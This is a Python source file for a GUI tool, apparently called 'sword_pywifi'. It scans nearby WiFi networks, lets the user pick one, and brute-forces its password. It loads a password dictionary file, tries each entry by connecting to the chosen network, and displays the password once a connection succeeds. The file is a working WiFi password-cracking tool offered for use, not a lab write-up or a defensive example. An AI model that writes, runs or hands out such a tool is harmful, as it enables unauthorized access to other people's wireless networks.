import os
import PySimpleGUI as psg
from sword_pywifi.MyWifi import MyWifi
from tqdm import tqdm


class MyGUI:
    def __init__(self):
        self.wifi = MyWifi()
        self.raws = []
        self.init_windows()
        self.target = None

    def init_windows(self):
        tbl = psg.Table(
            values=self.raws,
            headings=["SSID", "BSSID", "Signal"],
            auto_size_columns=True,
            display_row_numbers=True,
            justification="center",
            key="-TABLE-",
            selected_row_colors="red on yellow",
            enable_events=True,
            expand_x=True,
            expand_y=True,
            enable_click_events=True,  # event: ('-TABLE-', '+CLICKED+', (0, 1))
        )

        default_path = os.path.abspath(os.path.join(__file__, '..', 'dictionary', 'default.txt'))

        # Row Column
        layout = [
            [
                psg.Text("Seconds of Search Nearby WiFi:"),
                psg.Input(10, key='-SCAN_TIME-'),
                psg.Button("SCAN", key='-SCAN-')
            ],
            [psg.Button("Start Cracking", key="-START-")],
            [
                psg.Text("Password File Path:"),
                psg.Input(default_path, key="-DICT_PATH-"),
                psg.Button("Select Password File", key="-DICT_PATH_SELECTOR-"),
                psg.Text("Start Index:"),
                psg.Input(0, key="-DICT_Index-"),
            ],
            [
                psg.Text("WiFi Name:"),
                psg.Input(key="-TARGET_NAME-"),
                psg.Text("WiFi Password:"),
                psg.Input(key="-TARGET_PASSWORD-"),
            ],
            [tbl],
        ]
        self.window = psg.Window(
            "sword_pywifi",
            layout,
            size=(800, 400),
            grab_anywhere=True,  # Window can be moved
            resizable=True,  # Resize
        )

    # Scan WiFi
    def scan_wifi_list(self):
        self.target = None
        try:
            scan_time = int(self.window['-SCAN_TIME-'].get())
        except ValueError:
            psg.popup_error('Seconds of Search Nearby WiFi must be integer')
            return
        chinese_wifi_infos = self.wifi.wifiScan(scan_time=scan_time)
        self.raws = chinese_wifi_infos
        self.window['-TABLE-'].update(values=chinese_wifi_infos)

    def crack(self):
        try:
            dict_index = int(self.window['-DICT_Index-'].get())
        except ValueError:
            psg.popup_error('Start Index must be integer')
            return
        
        if self.target is None:
            psg.popup_error('Please select WiFi')
            return
        
        try:
            get_file_path = self.window['-DICT_PATH-'].get()
            print(f"* Password File Path: {get_file_path}")
        except FileNotFoundError:
            psg.popup_error('The password file does not exist')
            return

        # Decode Chinese characters
        chinese_ssid = self.target[2]
        ssid = self.target[3]
        print(f"* Selected WiFi Account: {chinese_ssid}")

        try:
            # Open file
            passwords = []
            with open(get_file_path, "r", errors="ignore") as file:
                for line in file:
                    password = line[:-1] if line[-1] == "\n" else line
                    passwords.append(password)

            length = len(passwords)

            for i, password in enumerate(tqdm(passwords)):
                if i < dict_index:
                    continue
                cancel = psg.one_line_progress_meter(
                    'Progress Meter', 
                    i, 
                    length,
                    f"[{password}]",
                    grab_anywhere=True
                )
                if cancel == False:
                    break

                if self.wifi.wifiConnect(ssid, password):
                    print(f"[{password}]")
                    print("!!!!!!!!!!!!!!!!!WiFi Connected Automatically!!!!!!!!!!!!!!!!!")

                    self.window['-TARGET_PASSWORD-'].update(password)
                    psg.popup("!!!!!!!!!!!!!!!!!WiFi Connected Automatically!!!!!!!!!!!!!!!!!")
                    psg.one_line_progress_meter_cancel()
                    return
                else:
                    print(f"[{password}]")
            psg.one_line_progress_meter_cancel()
            print('failed')
            psg.popup('failed')
        except KeyboardInterrupt:  # Interrupt program with Ctrl-C
            print("Program Interrupted")


def main():
    gui = MyGUI()
    while True:
        event, values = gui.window.read()

        # None is equivalent to psg.WIN_CLOSED
        if event in (None, "Exit"):
            break

        if "+CLICKED+" in event:
            gui.target = gui.raws[event[2][0]]
            gui.window['-TARGET_NAME-'].update(gui.target[2])
        elif event == "-SCAN-":
            gui.window["-SCAN-"].update(disabled=True)
            gui.scan_wifi_list()
            gui.window["-SCAN-"].update(disabled=False)
        elif event == "-DICT_PATH_SELECTOR-":
            file_path = psg.popup_get_file("选择密码文件路径", title="File selector")
            if file_path is not None:
                gui.window['-DICT_PATH-'].update(file_path)
        elif event == '-START-':
            gui.crack()
    gui.window.close()

if __name__ == "__main__":
    main()